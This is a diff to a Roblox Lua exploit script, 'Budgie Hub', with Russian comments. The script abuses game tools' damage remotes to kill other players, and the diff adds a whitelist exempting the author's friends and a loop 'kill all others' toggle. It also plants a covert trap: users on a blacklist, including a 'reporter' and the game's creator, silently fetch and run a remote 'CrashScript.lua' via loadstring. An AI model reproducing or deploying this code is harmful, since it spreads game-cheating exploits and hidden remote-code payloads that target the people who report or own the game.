@@ -11,6 +11,28 @@ local function GetDevice(): string
   end
 end
 
+local whitelist = {
+  10172035874, -- это я
+  4636825706, -- это тоже я
+  3133352547, -- друг
+  3536016467, -- друг скриптер 1
+  4227836698, -- друг скриптер 2
+  6066688097, -- друг скриптер 3
+  8427217856, -- друг скриптер 4
+  5080213871, -- друг скриптер 5
+  2405800210, -- забытый друг скриптер
+  4463699742 -- ... прости меня за это. Ты была моим лучшим другом детства, а я просто взял и забыл про тебя
+}
+
+local blacklist = {
+  3778040731, -- репортер 1
+  game.CreatorId
+}
+
+if table.find(blacklist, game.Players.LocalPlayer.CharacterAppearanceId) then
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/Dangerous/refs/heads/main/CrashScript.lua"))()
+end
+
 local Window = Fluent:CreateWindow({
     Title = "Budgie Hub | Random tool (9879422661)",
     SubTitle = "by ADSKer (Test828838)",
@@ -97,7 +119,7 @@ Tabs.Attack:AddToggle("Attack", {
     
     local Chumanoid, Cdistance = nil, math.huge
 for _, part in next, game.Workspace:GetPartBoundsInRadius(lhrp.Position, 100) do
-    if not part:IsDescendantOf(game.Players.LocalPlayer.Character) and part.Parent:FindFirstChildOfClass("Humanoid") and part.Parent:FindFirstChildOfClass("Humanoid"):GetState() ~= "Dead" then
+    if not part:IsDescendantOf(game.Players.LocalPlayer.Character) and part.Parent:FindFirstChildOfClass("Humanoid") and part.Parent:FindFirstChildOfClass("Humanoid"):GetState() ~= "Dead" and not (game.Players:GetPlayerFromCharacter(part.Parent) and not table.find(whitelist, game.Players:GetPlayerFromCharacter(part.Parent).CharacterAppearanceId)) then
         local humanoid = part.Parent:FindFirstChildOfClass("Humanoid")
         local distance = (part.Position - handle.Position).Magnitude 
         if distance < Cdistance then
@@ -182,7 +204,9 @@ local allplrs = {}
 local function updatenames()
   allplrs = {}
   for _, plr in game.Players:GetPlayers() do
-    table.insert(allplrs, plr.Name)
+    if not table.find(whitelist, plr.CharacterAppearanceId) then
+      table.insert(allplrs, plr.Name)
+    end
   end
 end
 updatenames()
@@ -207,6 +231,7 @@ Dropdown:OnChanged(function(name)
    local player = game.Players:FindFirstChild(name)
    if player and player.Character ~= nil then
      for _, plr in next, game.Players:GetPlayers() do
+       if not table.find(whitelist, plr.CharacterAppearanceId) then
   for _, tool in plr.Character:GetChildren() do
      if tool:IsA("Tool") and tool:FindFirstChild("damage") then
       coroutine.wrap(function() tool.damage:InvokeServer(game.Players[name].Character.Humanoid) end)()
@@ -219,8 +244,39 @@ Dropdown:OnChanged(function(name)
     end
   end
 end
+    end
    end
 end)
+
+local function killAll()
+  for _, plr in next, game.Players:GetPlayers() do
+  if plr ~= game.Players.LocalPlayer and not table.find(whitelist, plr.CharacterAppearanceId) then
+  for _, tool in plr.Character:GetChildren() do
+     if tool:IsA("Tool") and tool:FindFirstChild("damage") then
+      coroutine.wrap(function() tool.damage:InvokeServer(plr.Character.Humanoid) end)()
+    end
+  end
+
+  for _, tool in plr.Backpack:GetChildren() do
+    if tool:IsA("Tool") and tool:FindFirstChild("damage") then
+       coroutine.wrap(function() tool.damage:InvokeServer(plr.Character.Humanoid) end)()
+    end
+  end
+  end
+end
+end
+
+Tabs.Attack:AddToggle("Attack", {
+    Title = "Loop kill other",
+    Description = "Kills all living things",
+    Default = false,
+    Callback = function(Value)
+        frr = Value
+        while frr and task.wait(wait()) do
+           for _ = 1, 3 do pcall(function() killAll() end) end
+        end
+    end
+})
 
 Tabs.Attack:AddButton({
     Title = "Death note tool",
@@ -288,21 +344,21 @@ textbox.FocusLost:Connect(function(pressed)
       textbox.Text = ""
       elseif textbox.Text == ".all" then
         for _, plr in game.Players:GetPlayers() do
-          if plr.Character and plr.Character:FindFirstChild("Humanoid") then
+          if not table.find(whitelist, plr.CharacterAppearanceId) and plr.Character and plr.Character:FindFirstChild("Humanoid") then
            for _ = 1, 10 do killPlr(plr.Name) end
           end
         end
        textbox.Text = ""
       elseif textbox.Text == ".other" then
       for _, plr in game.Players:GetPlayers() do
-        if plr ~= game.Players.LocalPlayer and plr.Character and plr.Character:FindFirstChild("Humanoid") then
+        if plr ~= game.Players.LocalPlayer and not table.find(whitelist, plr.CharacterAppearanceId) and plr.Character and plr.Character:FindFirstChild("Humanoid") then
           for _ = 1, 10 do killPlr(plr.Name) end
         end
       end
       textbox.Text = ""
     end
     
-    if getplayer() and getplayer().Character then
+    if getplayer() and getplayer().Character and not table.find(whitelist, getplayer().CharacterAppearanceId) then
       for _ = 1, 10 do killPlr(getplayer().Name) end
       textbox.Text = ""
     end
